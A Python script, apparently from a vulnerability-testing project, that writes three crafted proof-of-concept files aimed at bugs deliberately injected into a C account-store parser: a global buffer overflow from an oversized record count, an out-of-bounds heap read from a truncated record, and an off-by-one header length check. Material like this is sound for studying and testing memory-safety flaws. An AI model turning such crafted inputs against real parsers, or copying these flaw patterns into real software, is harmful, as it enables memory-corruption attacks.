#!/usr/bin/env python3
"""Generate crafted account-store files (PoCs) for the injected bugs.

Each file targets one bug in auth_store_parse() when built with -DVULN.
See README -> "Injected vulnerabilities".

Usage: python tools/make_pocs.py [output_dir]
"""
import os
import struct
import sys

MAGIC = b"WSAC"


def header(count: int) -> bytes:
    # "WSAC" + version(u16=1) + reserved(u16=0) + count(u32)
    return MAGIC + struct.pack("<HH", 1, 0) + struct.pack("<I", count)


def record(name: bytes = b"u") -> bytes:
    r = bytearray(88)          # username[32] + salt[16] + hash[32] + created_at[8]
    r[0:len(name)] = name
    return bytes(r)


def main() -> int:
    out = sys.argv[1] if len(sys.argv) > 1 else "pocs"
    os.makedirs(out, exist_ok=True)

    # A (CWE-787): count larger than MAX_ACCOUNTS (256) -> global buffer overflow
    #             write once g_accounts[] is exceeded.
    with open(os.path.join(out, "poc_count.dat"), "wb") as f:
        f.write(header(300) + record(b"x") * 300)

    # B (CWE-125): valid count but the record area is too short -> out-of-bounds
    #             heap read while copying the record.
    with open(os.path.join(out, "poc_short.dat"), "wb") as f:
        f.write(header(1) + b"\x00" * 5)

    # C (CWE-193): 11-byte store -> the header length check is off by one and
    #             count is read one byte past the end.
    with open(os.path.join(out, "poc_offbyone.dat"), "wb") as f:
        f.write(MAGIC + struct.pack("<HH", 1, 0) + b"\x01\x00\x00")

    print("wrote PoCs to '%s': poc_count.dat, poc_short.dat, poc_offbyone.dat" % out)
    return 0


if __name__ == "__main__":
    sys.exit(main())
